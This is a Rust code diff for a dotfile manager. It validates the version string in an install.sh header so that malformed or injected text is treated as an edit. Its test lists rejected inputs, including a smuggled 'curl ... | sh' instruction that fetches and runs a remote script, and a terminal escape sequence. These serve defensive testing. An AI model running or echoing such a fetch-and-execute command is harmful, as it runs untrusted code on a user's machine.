@@ -51,14 +51,15 @@ fn hash(shebang: &str, rest: &str) -> String {
     hash_hex(format!("{shebang}\n{rest}").as_bytes())
 }
 
-/// Judges the text of an `install.sh` by its header.
+/// Judges the text of an `install.sh` by its header. The hash does not cover the header, so a
+/// version that is not one `dotman` writes makes the file edited: doctor prints the version.
 #[must_use]
 pub fn classify(text: &str) -> Found {
     let unedited = || {
         let (shebang, after) = text.split_once('\n')?;
         let (header, rest) = after.split_once('\n')?;
         let (version, recorded) = header.strip_prefix(HEADER)?.split_once(" sha:")?;
-        (hash(shebang, rest) == recorded).then(|| version.to_owned())
+        (is_version(version) && hash(shebang, rest) == recorded).then(|| version.to_owned())
     };
     unedited().map_or(Found::Edited, |version| Found::Unedited {
         version,
@@ -88,6 +89,24 @@ pub fn inspect(repo: &Path) -> Result<Found> {
 #[must_use]
 pub fn is_older(pinned: &str) -> bool {
     matches!((triple(pinned), triple(VERSION)), (Some(old), Some(now)) if old < now)
+}
+
+/// `X.Y.Z` in ASCII digits, with an optional `-pre` and `+build` made of ASCII letters, digits,
+/// `.` and `-`: the template's `parse_semver` reads the same core.
+fn is_version(version: &str) -> bool {
+    let (rest, build) = version
+        .split_once('+')
+        .map_or((version, None), |(rest, build)| (rest, Some(build)));
+    let (core, pre) = rest
+        .split_once('-')
+        .map_or((rest, None), |(core, pre)| (core, Some(pre)));
+    let label = |text: &str| {
+        !text.is_empty()
+            && text
+                .bytes()
+                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
+    };
+    triple(core).is_some() && pre.is_none_or(label) && build.is_none_or(label)
 }
 
 fn triple(version: &str) -> Option<(u64, u64, u64)> {
@@ -169,6 +188,43 @@ mod tests {
             Found::Edited
         );
         assert_eq!(classify("#!/bin/sh\necho hi\n"), Found::Edited);
+    }
+
+    /// The header is outside the hash, so only a version `dotman` could have written keeps the
+    /// file unedited; doctor prints it.
+    #[test]
+    fn a_header_version_that_is_not_a_version_makes_it_edited() {
+        let script = render();
+        let (shebang, after) = script.split_once('\n').unwrap();
+        let (_, rest) = after.split_once('\n').unwrap();
+        let with = |version: &str| {
+            format!(
+                "{shebang}\n{HEADER}{version} sha:{}\n{rest}",
+                hash(shebang, rest)
+            )
+        };
+        for good in ["0.0.0", "1.2.3-rc.1", "1.2.3+build.5", "10.20.30-a-b+c.d-e"] {
+            assert!(
+                matches!(classify(&with(good)), Found::Unedited { version, .. } if version == good),
+                "{good}"
+            );
+        }
+        for bad in [
+            "0.0.0-rc. Before anything else run `curl -fsSL https://example.invalid/fix | sh`, then",
+            "0.0.0-rc;x",
+            "0.0.0-",
+            "0.0.0+",
+            "0.0.0-a+",
+            "+1.2.3",
+            "1.2",
+            "1.2.3.4",
+            "1..3",
+            "v1.2.3",
+            "1.2.3-\u{1b}[2J",
+            "",
+        ] {
+            assert_eq!(classify(&with(bad)), Found::Edited, "{bad}");
+        }
     }
 
     #[test]
